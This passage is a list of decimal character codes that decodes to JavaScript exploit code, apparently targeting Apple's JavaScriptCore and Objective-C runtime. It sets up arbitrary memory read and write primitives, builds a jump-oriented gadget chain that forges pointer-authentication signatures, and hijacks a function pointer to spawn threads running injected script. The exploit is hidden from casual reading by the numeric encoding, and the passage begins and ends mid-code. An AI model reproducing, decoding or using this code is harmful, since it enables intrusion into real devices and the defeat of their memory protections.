99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 111, 98, 106, 44, 32, 115, 101, 108, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 44, 32, 115, 101, 108, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 111, 98, 106, 44, 32, 115, 105, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 44, 32, 115, 105, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 111, 98, 106, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 111, 98, 106, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 32, 61, 32, 109, 97, 108, 108, 111, 99, 40, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 50, 48, 48, 110, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 56, 110, 44, 32, 112, 97, 99, 105, 97, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 52, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 44, 32, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 52, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 56, 110, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 45, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 48, 120, 52, 49, 52, 49, 52, 49, 52, 49, 110, 44, 32, 48, 120, 67, 50, 68, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 32, 58, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 115, 112, 97, 119, 110, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 120, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 115, 116, 114, 105, 110, 103, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 111, 98, 106, 101, 99, 116, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 105, 110, 32, 116, 104, 105, 115, 32, 99, 97, 115, 101, 44, 32, 105, 116, 39, 115, 32, 97, 108, 114, 101, 97, 100, 121, 32, 97, 32, 67, 70, 83, 116, 114, 105, 110, 103, 44, 32, 115, 111, 32, 108, 101, 116, 39, 115, 32, 106, 117, 115, 116, 32, 99, 111, 112, 121, 32, 105, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 61, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 32, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 93, 59, 10, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 106, 115, 99, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 97, 100, 100, 114, 111, 102, 32, 112, 114, 105, 109, 115, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 44, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 52, 57, 49, 49, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 32, 61, 32, 112, 97, 99, 105, 98, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 44, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 44, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 109, 101, 109, 99, 112, 121, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 51, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 53, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 54, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 55, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 41, 59, 10, 10, 32, 32, 32, 32, 105, 102, 32, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 61, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 99, 116, 120, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 32, 32, 32, 61, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 